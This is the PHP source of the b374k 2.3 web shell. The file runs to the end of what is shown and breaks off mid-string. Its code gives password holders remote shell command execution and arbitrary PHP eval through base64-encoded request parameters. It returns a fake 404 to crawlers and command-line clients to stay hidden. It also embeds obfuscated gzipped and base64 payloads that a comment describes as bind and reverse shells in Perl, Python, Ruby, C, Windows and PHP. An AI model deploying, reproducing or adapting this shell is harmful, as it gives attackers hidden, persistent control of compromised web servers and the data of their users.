<?php
/*
	b374k 2.3
	Jayalah Indonesiaku
	(c) 2013
	http://code.google.com/p/b374k-shell

*/

error_reporting(0);
@set_time_limit(0);
@ini_set('display_errors', '0');

$s_name = "b374k"; // shell name
$s_ver = "2.3"; // shell ver
$s_title = $s_name." ".$s_ver; // shell title
$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // shell password, fill with password in md5 format to protect shell, default : b374k
$s_login_time = 3600 * 24 * 7; // cookie time (login)


$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['b374k'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_pass)) == $login){
			setcookie("b374k",$login,time() + $s_login_time);
			$s_auth = true;
		}
	}
}
else $s_auth = true;

// This is a feature where you can control this script from another apps/scripts
// you need to supply password (in md5 format) to access this
// this example using password 'b374k' in md5 format (s_pass=0de664ecd2be02cdd54234a0d1229b43)
// give the code/command you want to execute in base64 format
// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
// example : 
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==
// recommended ways is using POST DATA
// note that it will not works if shell password is empty ($s_pass);
// better see code below
if(!empty($_REQUEST['s_pass'])){
	if(strtolower(trim($s_pass)) == strtolower(trim($_REQUEST['s_pass']))){
		if(isset($_REQUEST['cmd'])){
			$cmd = base64_decode($_REQUEST['cmd']);
			echo exe($cmd);
		}
		elseif(isset($_REQUEST['eval'])){
			$code = base64_decode($_REQUEST['eval']);
			ob_start();
			eval($code);
			$res = ob_get_contents();
			ob_end_clean();
			echo $res;
		}
		else echo $s_title;
	}
	die();
}

$mtime = explode(" ",microtime());
$s_start = (float)$mtime[0] + (float)$mtime[1]; // to calculate script execution time

// block search engine bot
if(preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT'])){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}

// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php this was used with bind and reverse shell
// use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
$rs_pl ="lZLxj5MwGIZ/Xv+KyvU2SLhj80xMVllcGJrlvLHQncY4JQw+BzlGCe3pzG7+7bbIOaIxUX7q9/bL8zZPOHvi3Iva2eSlA+UXXEFdoDOcSVmJseMkPIXLLefbAi4TvnMqZ3P1/NndhcigKBx0LwDPg/GY8eQOJEWEC5d8CtRBZK4B+4rXEq/88MbdS6h3dMlG7mBNlu9m68mAtvcqpE2/yPBFblCUfzY16PvO+arS3Do0tHMvuGFL3zvHzrVBj4hIdwuyqrnkm29lvANzIJNqYFEkmteYzO4vX0Xzhb+y+yzwriO2Cv3pjU2k9fCQ5mBaTdXLafj6reuOrAPqkcolevww/EhRT4DUKF5pFgveRJqiaCyIQv+W+dPZLLRHitJTr0/Vjt6O07SO8tIklT1f6I1ounhvnRp7RS4klGr7qhPGSQKqxrOZ1RQrnGcbjWvcuMZjnPCyhERCui4Ne6j3eAUlZqvZfGEbL/qeQR+D4HZlG5Nu4odhm6Ae7CHByumpPim4ANOz6M8D+3XQ7M6guJ1JMa0Gl0s8pAgdERTiZPTpn0ZJ1k6jZsrdvAQZxZIrX1lHB4nd31ySvHPdmlAOSdyJG23s37SZrbZJnxkWfUxab92oFaejv5v7L2GNJjhobab6e45IfT8A";
$rs_py = "lVRtT9swEP6c/IpgpmGrwaGFaVJZKiEIE9qAqu20D8Cq1LkmEalt2S6Ufz87SV9ATGiqWveee3vOd+f9vWipVTQreQT8KZAvphDc3w8KY6TuRxETGdBciLwCysQiktHs+OvJ46EuoKoiv1xIoUygINTLmVSCgdah0KF+sV/BHsGEplyAL2OE/ML9ZDAPamfMSN/3nE+89aVDIYFjFtYm8UQtbWSTiaV5ZXQ1TBwMSr0Hl/wtSnxPgVkqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+fUYdbRSekw4KBrtCbyvZPFBpcNmfC5s6cDflJM+ol/r0lGWlgD3h7lHvxPHyYMVAmkYrU61rrI3iucpsCViRwVEDeLNYAdWQKlZgxLL7AN/9udcPHYJCFc6rNNfO4Or7ze0oOT8bJ6Rxs4FmbYT2umRqClrqrFR4RnMllhJ3CVnbuAtjxRtlq7ONAZ7hdT9aeEvaOrvRqOdJkZ2kSxOkPKsrsv9dTW0oJ/mbIEE7FpeplZpur3P1NzOD7jnqWJI5GPbsxgMNkJ/Htsk0VfmT395cTuK450Y6zu+6Dz5UO/jxFvcKe/ac3uaHVWlsuXY/Sm6wJL6Om7WhzYFb6exyenWTTNqdouPb8x/T8WSUnF1bF1uYcQohN/bj259TZ7TrMh0lv8bJ2cXFKLQZ35DW1E5ghjE6ovUHhdLdtqZVaUeZ4y+vPFw5btAC2znBOTCDcdF4bIfMLT7VFYB03pumvbdBnm6ag+rHpXkfgn7QxobMNsA1bdP3D8xRZ3dg2vXVxG/9HXP7xKQktg1kji7+F/HuR8TZ/xH/wPxd4oz4fwE=";
$rs_rb = "tVZrb9s2FP1M/QqWySprcaSm6zDMmWL0sQ4FVtRI0w1DlRU2dW0RkUmNpOoUSfbbx5ccu7aTDNhoGJTuPbxP3mPvPcpaJbMJ4xnwz1i2ky/RHq60btQgy6goIZ0JMashpWKeNdnkux+eXRyqCuo6iyT81TIJOFaCXoCObwXNWFd8PIc4ikqYYtXSCxUhCbqVHJ9+ePHHp9Gvz89evzt9m5ZiwelYQTofa1r14rlaMH5tv3PGZ4s4GWrZwmA6rhVEwEtvUcK4tk56SsvEWM7NHiE2xa+ZiRUumdJqGJRGOwrxpBwWTpp2BlItPpnQrGF73EWKdQUcy1ymM9VOelmRZX1SFCTBDhbSkD4ac+j56S+/pTXwma7y/CjCZlnRxyfn+d/Znx+fHP54fnXU//5mPxs2+RuuYQayFxDJwASr3RmVn70cvQf5GaSLk5B+kzgNzVU6phQaD6RpIxnXmLhuYNcNPMBUcA5UQ1lw4nATmDHunuwygXKhQy/wyprm1FaBrQnhEihWzs+0R+CyEVLjs59P3+aXGuT8ePT+KI+L/dHvr4qT+DjojfDY3SVV4UOGi5+Kx9+UuDhx21O/k/7UfpKlN7CNXXXdpbfsMUlJckBOyBpqUZlO49rEPgO9npBdcswUYJBSyBdS2ORr24ySQSGH+9kGPlSnTmkl5k2eE7IBCTBrh5Y4/TZjWyF21Xkd7o5BZqwfx4k3vPNEd3VLMz9UC/ll2KuTnWjvY1mge5CvmDTejeW7gPYy79I9rCNLS7UKZSoWgzvLtC1pX6cHJ3Qf/D9NC3aaevMubUQDvFf3iSTJ1TUT1515JizblAfEzOXBhq+b7c62hP21bPW9e5agaHt77w35LekFuGrlbQYqpbVYyUjlnNVRZ8v3cI3YnjqC3EFsxtEmtR0baZW7t6Nzw7G2gCEgT7ie8dyPh2e8vavqxrEeUg/gOOQJDqE1akMITQ1fOkZD1t3/TWSoy2wZ9OaFMsqOsJQnLCNB95CUix9tYSYU5KtU5GRoN/Gg7tAWmkHd4VVGCcI18vAi1zu37kzY1eUrJtgdRTfIm27XNf/GOQTktulUD5zONadh91v4M7B14FCYNhulnzPz5CYMhfHyk+fAVvIP";
$rs_c = "rVJhb9owEP0Mv8JjU+tQFxPaaVJpKqFCJbQVEGSapg1FwTHEqrGj2EzQqf99thMYYdqkSf0Q5e7d8zv73uEmSLXO1A3GRCa0tZJyxWmLyDXO8OLqw/XTpUop5xg0cf0tE4RvEgpulU6YbKV3FShnYnWKJZwtTrCdwnqXUfUnrCR5orqKC6qZ+TATVXwjmFG3GBMarGMmoA3ifEUQSeMcNE3449vc+1mv2YJCBMnA79Zr5qIbYgDTLE6SPGICMAOzJbSHg6Bjj9RYSzERLeM147ug9xANR4Owe8Azmesg1VIoGGvJoOvlzz3vN8Vqt5T7OSaHw1Gv359GvdFXR1NB8V5YqqPZ+P5jNAung94jahcUqi1HZhoqU/4UWYpjRtPB59nA6qEziRR7pnIJZdl/Cd8oj26ZhoXMgonECMCTl4Omd8ZQe+sXLG4GSoXhvXcpCWJCqOvcPlzH6BDUcHsB3F6AG0CkEJRomnwXDdS5LrnJJusYbiXxj5NOIbkzTdewQbd2pCAcTB+Drab5ujuZ+cH5u8mX/t15t6wayISUAGxehFUKLlmjuCuXikJi45d6jXJFwcHOq9e30y6kiwpiZ15M+Znmco8gM2tuprknXPgXx8he+587MJxMpuNwHIX3k72vsBz2X90sN+Gk5nnebft4I5yT6j+cVNXEP05e30lVOPlS/wU=";
$rs_win = "7Vh3WFPZtj8pkEASEiQISDsoCigdRkCDJAICChIBFQtCGhhNMzmhSAsTUEOMxq4ICg6jjgURlSpFcChWHBsKKDrohRvaIBcYUc8NI3e+Ke/73n/vj/fe+r619lm/Vfbae/+x9zphG9UACgAAtJZhGAAqga9EBf57kmnZwLraALiud9+mEhF63yZqK1cCisTCBDGDD7IYAoEQApkcUCwVgFwBGBAeCfKFbI4zgaBvO5ODHggAoQgUYE+zCPtP3h6AiMIhkN4AqFVIWhYBgHrfzISFM9VN48ivdSNm6v+NSmdivpq1BM7opN9x0h8Xoc1HQQD/47SWHu3624foDwUh/7a/PVo/t/8s47f1z/q7H/Wrn/vviyuc8SH/za/Bw9nVa3pyG4IeUp9qnPRJj3lrQx4bAMQGWg/tqdgigPDWOBheq3gnH8AWjTCoQBvcE68m9g5W1BMiSZ4taFu64aw+BGBINqgZTKpBY/R4aIO9qsCRFu2cigD+EH/KllQEutq2YNFoOsYDqNWUP9A1wc8f08W6kS4VYYcT4VfknAbpSsJ1pbGtu4KExznKe1+MZ9SMYAibzW4qfRTo5V++bBxAF62KANMUTXNvKywmJqphA0MLpWXPle9CFir9Sfay/MBq3j0j16tCa3d6vxAGVNACAJ5iDVebViN/go2fMMYAC7Xq+oJ3u8juL6wRLt3CinGyMhBbj/A9YNiQtNRXpSs+MWT5alWNh6X9cmyNSRec/kQ+iSBmw4TZxJwLGLeGT7UvvshvkzfFNKJph6ENvkd1zX0PTX2pei19o7nhq4O9AgX6WhrdX19jqUagIUkkVEq+NSTAqBLL2iv7Yc3pKygz1wm3zv5tRF8cZmlqzZoD2QLQVO3Xv5nV4Yh1aV7n0nmAkNjvH4ZQtnra2WDEDHMc7u41azE2p1OqL+7/og4zHTeFNENqYH/Zz5avjYkBSoIjkNMGuV0GqFbNV1JtI+C50QSqn6Fjre9zn7ez9ezcb7Y1VY4/fDn1WfPPcPz69esiK/fO2rXM69cdyU/GTN0DD1tLaoSKRlVBcn4VZpm/4vWHiyfiJa9bcoxIBL00tEdiqvN8GXpzkIKck+9n9nqH3DduLyKDXBTwitSlaI7fPzoYBurU+bjSVDl9n0uWPnA2Pdygh1/khxow81u0HEnc3xtDBjAiXbNeEh67alfbUcaqAL9whURCHMy5Phg/qDFtuD24G/Kqz+gYzCke7EUr16vv19YS+1YAs1OV/PIFXfEtHiuIFc2Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wSRTc5dnowBe+Hj6uVEWpbtBLrSY+XNh8L3DOF3hP/Up9ZQRe6a5o+VCMaH0Tg70ycBJ95/JZzzTTuc2FhnDgkQPvX+yNOtIahR7mJalD//nlXHqxxjCNX1ll/m07Ym1B4JNoaRelt6kM2dPLRSMMA7xw5+53VO1wvDRaMnE2NXngUYhivDmbsHMzZrD6LDeP088aSrb+51nzYi5/WINhF//AzRsBBpxP28Zeo5lcRlsetr2UttsruMkWRFmYYhal2rDVJASm/h/bN+pG2VNMZyMLCgSnPPWw/c9DiJsPvazvTOpvIao4Y5u2xLY1rhq1bKrlm/D2dNTZnx7+8P2B3isjazfvFPoBxNLd+49NGRYHN50cPZ7dtoRNcoUuHTMYJyRCJIPbskoq25eSUj4See38sCvgCLSC8nx7W5BmkN0I2c1DUp7FqUlwZK6uK5VgNO+YxfVH54Yd50N7lwbk32wPdokuo5xbrP/ldT9nuL90IblFRwzUN4FwCfWBBrEi14pY3tS7D64dyRjK7oRCiuZn7qZ+h1VtQciWjQjrP8+Vmmh0svc4+eeiKPh/+WvMZenPY8u6+U8tiXsCnwc0QO+avTqaK1DfSBCaM64d5++ll2RbLzXDVJppLE6ibtvcrj6Gtewj8amT8iZ5OlZHiv/RwvyF/nUhBZ5vyjwJY1zZapou6G2hlWaOnuRAXTO2PcWWr2l6y7bOz48O/Qa3+FUFrpleoF/g1v4DjvKd24cdtr8SzwQfK5djhEKD8WZEj5yAtzdZxCMm/pSCQ040WsoWGszbnaaLBhBYZHrwBxtS1ls0OH5LmDp5yIEqewdKnZ/Ltvvqpg28f5VomULgJdt4UyH9LKKdcGgNflNMk0zSbGqbl4ADEI/3B3+ulx/LVsSMRUknFc8U6Z8UD6UEZfTW7nKS0kCJH/BraF0V0jOW8g/Yhnf5x+V2iZSu1IuDj8pvOKCTbBf20ozieLS6J25Ug1bErdCYuxBpMdYgyKXNo4M0QN27O+iQ5sgJrF9/7KB+8V3PVk/vz8XR4cu9xkhj3qqbdrB9Ecn1eZdk9G3Po2uvVnZ21lU20Kyc0FkYi6mkqRHHOxkvDXA1szPslb4YibIezoGlVspvbuuNS8kNrbRJepJypOYeVh2rNOrGZ8ZmQ0uyppwkeXW5ivSecjjavAqdjxhRklBG8qbPa4sSanTufLygH7pQ3P1sIuxB+36HjHp5KhYRvrO8qoQVYeKGtyPKK+B9llfWaTys5R9BKBWNhVLrKgajHR7qkrp7IT8jQWT4Tw/w0T56W5S476PfdndGxowgfnFR+khrD5EGrgwNn01e5XBHRVlCrTqhWtt7in1wMFFT50TKtqQgMKM3iIUo7yRjdO7Q4LNHWXeYsDviY1+vpsSgdOP4QbhWDdSfLzqssR/IOG4iZC1d14VX0c9TQWMcKVtFIPW3ycsf8vnJSz9UWo7ZlEzBuTmX62uFF4xUngXEYXi2fAgtf7S9Kb5FOk5st7gz6nebtGpTa1RQc6KfiwJrNjie4Y9QknPcJqUjB1yuHzAnYPNAOjKpuVHOI4JtmqxDoXxv05qL4/COT4o1GY1jcUgkZF/XPn9DA/qEcJmR7KPevLvx5eA5LHhqrn78QDfkM1vRDq0gH+GIUquHd0lJGgqFlN3wEHLuzMgqv4Xw5+lJ+zRziBTvS1mdPH1DS+not7rW0l/KSaNR8yD6uEedrCGHuAdCP5c+cZbvy+uyVUP4R9hlRYgmHAZDF2yYF136slbF+NS0pj/QJb3xh8RUaJwhPZN5p95KL8e/8+cNDz3pYKUujxp88PE10VDL47irIXYxV7JPdx1P83UMTmtf++BTk5t+eJzG4OK43ojPy8GYyVVZj96slC2hnVM8IGKq8fwpuTddOu/KZEmBzubX6kM0Was5cwM6xQZNo4zZ7fsla+BexemqM6U0xfN5SYok68D6qw78OtnCOf9ql0dNZa+J/+7Bq8tgwgCd0lSF889Meno98EILCtfib6q0CF9drmvvGozlVROXvtINLbTqvLEuJkeqczWzv2K+Fep1sOKlzZ19CLOf5G/B9ebGX+SNtD0kn5HhhYkXfMQdTQ7nn+9H7414Dez6dnB5XKlPE0RNFsxDhV4KcLV+sy7XeJl+4AZjb+XbdseT2FDKdyeymlbTNhJpmng1LiW5Q9Pudox+htbS2LnmE3bH/oLM4VKxcVY/Rq4HOJGTNA77z1ZU3yIpXtxTYm/SjeVp72aFtzIw7fcM3FvBrj4ssxe0Cx9jfEIz8ykpox0MgDnAmNSa5KV78rUSX3i9WCvdz1/K1srWw8dvVmoHUL1XNu2zlRc37cPeLDrYg3ePhkwKS1+IkDchkpHhUMN7SRqlk9axDICtzy88CEREhkW2f4HhSCCCwxdCHDCSI07ksjgSMIwhYCTgZV6gqfVC9FyqLup86/xeOGgNgsdlJrC2xUqcd2vj2DweELsyMTaCk8CVQByxP48hkXAkRMdKcv5mL1MjVObU8ClnZxektjuAuHyOi8hByhY6iTnwIDzFE7KcWdbruGJIyuCtkYakgPYMNlvsaN4BD4ILmCgJdydHGG/PdHAIQi5OnFq8h+Xk6YxwcznCMoIrYKILSyiI5ya4cD28F+NSEvhcQYKTZCsD5g8I+WwnNgNiiFxjFoBz/YVSHlvYCY8L7CDQHBJzOYkcUMA4BYrAIP/U1AfV/lHgYhBECflz5eOl9d2OTsuOg76+hbGxXEBZgI91iA1kCyuivewlfDxr69zdw6vZgsmdgJNlaMhy/4lBGN4QFBayOsgpMNgpKiDMzSlyZejKOVHBEU6zycZxY+s93I8V63/LM+oF1shKOUcsqCVx6HjHc6VtFFQAc+Njz7DHvIx9lxrullTx2pl2Qx9ReNYcLei5YHFwNG/anKE+W9d1f7wsrHecFaTLRs1eMG32XEHfyPwtOlmWe9C50zMsr7ikkr2qkZt3dns76lXfyJdOz/tlWI4paO/OGY5iLFqIssHNj4wDfMsCX5DjtN1Y3ElS9BFUSxyKrlOOBE4gzzjqHYfvwmWyNQgam02DhHyav5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJmSyw/g2rDKKs7WcMUp8ZHSCI4AMv78rNlqrWDrBnbJDyKIKxRcrpp9/QKvxYJM2uyF26Z7QAJ5bUimtRGLMN+HYSfPRfvzhBIO9nO8//GLhuTqcNGuMGxlZqS/LbEUDGizpBnqnCxI94fEvGDxDyabZkvuD2ROjPkamECpqCXvJaKN5eHXfHy/L2uNjU2BXiYtIvO4jgkSAxGy8Vb5M7lHl4AQzxfsFLq85thLYhkiQyhFRNz1Ps/maRx2y/P7eZtEGAemjpdB/YepAWcfBlNox4AwQq4mbxFOL37OwUMsbN2igJNZvF8wHD5LlHI/vnOLhJtwgHeulhyx3ih+32AkLRLc7oDr+faFNxTGKl7NlDS+Zz5kSezwuYJCszMVzm+2mkDMlCaD7oEy2VYBT/cXHvMia3BYI9kqhdjCJD1tj/0Udt2ZEorQ0TbZc79219sFYR+0HTYZRGJIhiSbM6Jr51ypOJNrTRY7It9QRHhR3bUOhwVWVBKG5L7TxppACtbN7yh5s9C5GMJgZ6nPuGxaTL6dR49z7pjY5ZM+jn5iavfjqdoYqmmDs9i+AUFK+Hgg325OHNWZWXXycgwYrqbLHML7X2EPcc3jzidZkOXoRW4PpltVQ0ANAPDvPWpcnbGMCqjqNPtheL0Gp87VXbEHE4TolGKUVvKhT4ad4sHK6Xb9D4hhA6JTMizVm1ElvW5t8j6UmHCrB6uNlo/AEKT48Y/+bX9SpCDtL8Y/JZPfQmZ9Bj7AsPwRQkV2kX/+lEjMRS7XFhUinehnwTCsViLljWgFRt6Clvejk35BPOwP1cJbFBNVcm03Xto3WiI1kfkhpBNKTPytPuytBtKu2w6TiJGLmp9VdUAcACgxeg0QRRmLVmW7Tm8H4gNd3oKFj7K130dyMUHYBqhL8ev64NGStfDRrVpQ645RoORNaM0b+GiyFlCW8LRSm20Ehmum/wHQo7ahI9fDT1W7T2u3SwZmyuLsM6PpUfRpMJqhCrCVbQN8bks/ygdk/ZgsGAb+n/6v0/FCAGAX/hn7XqvL/oKVafU9f8Fqtbq68L/O26rFn2n5vZbHtYwuAoBZRV9t4MzoPDN6zoyrAiNWB4Z6uDsHhIYCtIB1NHrIjMKXJLLEkPP082J9pHvsDAoAoUIGO5TLFDPEKTQA0N4/2quJpb2sxByJBABmnhJaDOKwoN91Gk/70vhdWyHmcLSZpm+y6eDfAoFwEUcw8/TR5o3lCpkAwOQK2P87zvzf";
$rs_php = "7VRNj9s2ED3bv0JRCayEai3LDhBgXW4u7bFA0BboIbsRZIqyCEsiy6FqB9397x2Skj82zm6QBr20MGxTM5w3X0/vh7eqVtPvgtoYBTdpymTJZxspNw2fMdmmKl0v37zeXkPNmyadcq2lzjVXUhvRbaJ5vJoCN7kRLc8b0QrjTHKdi1Y1ggmTV00PdYTGKTGF3nBDiQZ/Wo0moHyvGkwdhUGYDEYMIQxotly+wdOuoF3fNHjihxPUNMRArCX47adffqZ7w3W7evdrRq/uyLvff7y9Wg1utK3StehSqINrEWJsS0PXWeA6C24CJruOM8PLuw79U1FFTPadicYSY0qz+K/phChKxvInBCsI7b9BONGVeH6c8gb4pfDFeTi8n997iIMhux+xCrZ1WLaOqu+YEbLL+V6AgehKsc40eSX19ir2mKKkR6Md9gTjnJleZzHGmSg7sXrLfLAoCWKf4xpBlFF8HuErwJKG/lw6oGA0L9ocJNvi9oHrP7mOQsMUUmg+c5+bcEZUQpAxnXR/GGMTjqEDa2SPM4Jk6Yoh7AlywRhX9sJQKnqNbOQOs0G/xqcI6Zv3XdHyKE7myTLG+sOd6Fyhk2qnheERYQlpZzhhtsMGZ+FtaOEmu1o06FSvKK0K3JkLsQuq7DIwyt1yE9J8k7eFYXUUpqy8C6L3H+7g/vs4FUhX7FLr2EdPSFkiwbVfpY8WkJdCR+iJY1aPR+8mkp7W5YyP9mcgkdGiPe2aKNeh3U8YPDwEn/H/0aM/DtY4y+1qhAswGd/bjjEXsnz2SeaTeUlXoC2lYo0EPo5jfHIbQbcFfjpqd5GUQAuti4/RnN76Q6iE4mES6jBOsqfGHRoXF4weTGmqtGS5VLzD5HWC8Dh5oZwbB/UKp6w5yF4z2yHu48j6U86tG2SWlS4bjG9gMn/+RvbijcWzN9jg9GQzuh9oZt9rLis71ocHf/Lp4vi4NaKLYYZ2rkM5Q1JPoEPOBrUrwvsJKiW+bkViNfJAYNHlRxxdHMgqaIXxpTMzGDg5rnIYEBHxkZZnWGNBlwBH3yeo7AXAxTOAi5cBH885ekLe8ejbOn/OnjwP43WUG83aM/6g714UrVAPolhZ0fIErZ0q8A6/o7Z9vXrBV6kX/GfVCy6p1+f0Cv7Xq7Mb8JJewZfpFXwjvYLLagD/ml7Bt9Yr+BK9+sci9fZ2+jc=";
$favicon = "AQYD+fyJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAAEZ0FNQQAAr8g3BYrpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAphJREFUOMudk8lPU1EUxvkbXAMdXlug2Kp0eu8ViiUIC2wZJJYqkwUqFiqUMjqgAQppUnAIiBKmFoq0thYKBI0GBGMw0ejGxIVLdyYmYDQ0xPD5HokopmXh4kvuyb3nd853ck8cgLhYylymkblIadlzxmNVUXpAuf3vmwOB9pma+DvWhElkhFRhy4Cer/YpaugZ+bdDASfZiktU8+84PaiKqP3Kr+YbOd6CXnqbHpPtltjUzpgAzQK5mTFPRvZaDpBb9KwClFcOyi1H53oT1j+H0O6qgK4mrSUqgPGpTX+khMZHbuYFTiH4YRxPPk5j4KUDklvJqFjOh//1ME70H8VxZyqkDjFTdZ7cYnzue2d87mZ6Kcy+u42epyZcDZegNVwJzTAJiTMFpmkDsgtEn/Y7YHzuMD5BP1R4NF7yy9lgAbxv+3FzqRz2YD7KprJg9BfC92YEQ6sDkHanQG0Uhg5YoKblG6RbBnJchsD7QXQulqIpoEeZWwvDjB731xywzxrwYKUXkk4xxB2i7ymtQuuBGZCjsojRVwTXcysa/TqUTmSh2HMa91a7YZ0qRNVYLgNwQtwmQrJdsJvUSEBUz/8zQNVQ2o/aoAl3VtpQNpmNMxN5cC22w+LRwzSaC8e8DQ2TFiTZBEiuJ46wOYSZe20fQN9V9KW5JOhaakPxuA6uhQ5Y3DpUjuSgZ84G6roSostM1TqiOuY/kPUdWyOauRh7MYiuUD0uMqCeuUZcmWmBsI4PQS0PRA03wjdxmqMCWEmvitekHWI0uGth99RBahPvJQrNvGomUcurSNzkliaAcy6eiApglWoXuZOs/J+CS0xFMxf8Ks6rWAsXd9g2suJf4GzwyhPBPZ9A/BeAFccYv5NoiN+KdvcLtyxxEwhxgvoAAAAASUVORK5CYII=";
$style = "rVZNj5swEL1X6n9Aiiq1VUCYULoL97312HNlsAlWjY2M6SZr8d9rgyHmI6kqrazVRjCejzdv3vBVlZxJv4Q1odf0Z94x2Xk/OOPHFgtSZn3O0VXlsPh9FrxjKD2EYZgNd1ryhlMQNZes4JSL9FCW5fjmFZNzJdM4DHsJc4o9WamiE602QriEHZVZXwmVc4GwSEFz8VpOCfIOURT1UFl3cfF0gmUm8UX6CBdcQEk4SxlnuIdpxf9gMZm+vLz0jcCqgQgRdk5D76m59CUXtUKkbSi8poRRoi82q0T6Qw0JWxQIAMgmR7o64yrza/7mj/n6AiLStSkI9fOdR68EyUr/DD/1hwpD/VrVUJwJS8PZbThWBSk5s5TiUk6mnkQ71vPbCqgb9JGJdvM4X9Pw57+J9KWArDUYpIJLKPFnH5yC03eEz1/Geh4YOBG9uSG6vxouzLoNXFNsz+AV6z/9vz8I3GqE1X9gt2WEJcFUZmz7YXrpVyPNQGJurjKyKUMIb8kNrPDCPjC1EVZyy0DfdGAnqL2YODCb+owjE3P0I3OqnJZPz1pPCmUTjHTWmWarJAWktuk1QYjiPjjDKzwGDpVtbHeOck5RP9i8R2sziqXURbcNLGxJfWC6WhO1hnnmlDPhLtLRsznZvwd2J+haRN6lth2uxRuqxbeKrYy4NZ0Sc+6n869sbjMUENZ08u0YNILXjTwG+A+kBUd4Mz+W96HLsynpnEvJa5eep2dz7otwbwOqLYnmDG6UzSxLTxGup5TzTqqV+0XKz+as2j6PWbw7yEbaA3xp9JVFdJdy4WyhRWdX9+f3Wifv4qNDZYtNsJCLvWmUvHFcV/McJHYO1kAuh8CpTE/9DqXAkzmzESWtHK2W2hq0uNYL+ErmpTWMzlbiTZu0erlW4yNvWLd78DrTPCC9GonkgfhOrqujRmZb1o5UjfaPO2StKnC0P8RePVWknE1ZYKZFxCX+t1VZo8IvyVqYMwMx7JmVGiUbiUgezd8ClrmDRVFokSb4tSTLFjj7ZwH9HVgmFwZAd+3Ej1IylN9pzUR5YBRvclxo+DSQs3MARpZrTbzm/PKu+xqsNonTJBvOtHj7xXPr5N0mxPFSgKy/9T4W7S/7HeLiY9O0Dswnrc3hNERd7UFv+gzckmRL/jngjRrafx+UnGvOuXQW5pZTM0iWW3GHqY7QG7J8/PAX";
// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable
$sortable_js = "vVhtb9s4Ev4eIP/B0XUNEZZlO+19ONPcYNMXbHHd7gFb3H5w3IKiaFmJLLkSnWzO8X+/GZJ680vW7eG2QGO+zTPDhxzOjO553lmwi6F3yy5G9PysyHKleJBItpHj+ToVKs5Sl2x4Hq2XMlWFL3iSSOnHT0/u/iBbeHfdrkgkz9+nSub3PHHviBdmQi/0RS65km8Tib1utxqPpLKDxfXjJx595EvZ7bqVNT5ng8/uTXgTXpHpzeDG7892erpLrvTfFwMvcZ/Fdh0N6xCv2iMnm/7ognFfJLwocJFfwDbEwh3cBGgICtwEA9Lt1mbdgdiWELL17sZNpCEDoCOKF5KHDvETmUZqAZuEAXaYoGqxB78+X61kGr5exEnocj/PHorpcEY87sdpIXN1LedZLhENhuZxXii9lBCarpME7VE/AxgotK0/sxDR4UbEc3dUSWu11nSyQR6CTKlsicNsOqNggnsPVypgQxpMeHM5DXo9YhjWtgezo0wbTMO121YybXct9qwGJRQMbi8im4qBd1mmkPJ5dpzyOaxxkNcm4TAKTOL2zNYOmqG3CCtbkjv2o4WhTKSSnfbMFlmHRotqOANfyCQpGqrtuqZO2PKFHW7zuuSqplVf2S9phm0kl2zcJUyzUyXdKe//Z9j/x6xHtHi3e37mZvcyz+NQMoSajmB3DbiVHu12ndI3HMbU40pm804FO3Ww+cXplUizq2fmxrXv3brcC1rqMhY0uwKpvM7CWCKPFO+laGzWk6wG+8oajx3QiRdVLeLi6B01lGBLhpqNGiuXYG2Brojy6LxNnF3YXK4SLsDtdlEdb2/oi4V2LGgul8CMuWcH3rvrx/fhLu78IYxT8G7iYQ/woHfUF4oVT53mSj8O2Q6gmXA8EzvKZWkq858//fKBOd00KFa0+7c/Lv9+/Yo6xvBdBzFihMqkkJ1vpb9k5f9zDBXn+8fxPxyDZc0egzmUU47BrDxwDPZcW4sOH8LbY4dgxMwhbFT5HOmlK56DJR+zUNLELad8gaI4WMDpN8OfDhgpTHwCZ9cRp+adfyPp+in+RnEtBoGZuofYPdFBTJy3XNYEtE67SZt7yKFOvAVGl3WeZ3SVftK+vD3mdPYooCdfLHrKxaIHL9b52e7Vos9eLbg1X3ie80dMFkSWmNuVUZ0/mE3puFclEhxCHp80YyyHeFfBTKtWlQlM6xcgdHUM5TaGTkEhJEx2bFYb46OIeSdWwG1gLdFGVAa01GgrVNDaZ20Un+lAaMN8Nb7dYm4ifB6Gb++B/w9xoSQwSfaHXEcksbhzPOndWoeU/hxSbvjLUtBNhR9AF/6yDdxzpCpi0PO1HI1grtGHNZ7ws1R3wB8jiIesGoDEJpoC8IxJWg2y1Rb+ebeNtBairU755ilrFAp+Uh2WAK7EpBl0WwmgMJmKkn8o1jykPYGpKE8MsiVwZYgFIKPjMjbK3ORz/2p6sx4O+csX+ufVDPqh5896P1y9gFCQS7XO09oz/BT5X2VFEYITsAZUo86ArEgnzwy8sJBQxFQC+kwLKTJwqP3JS5N5ji4nWnxfeWSnDcL+/JJabhsi221j2TzdemGrysC0j1skx6ELXrx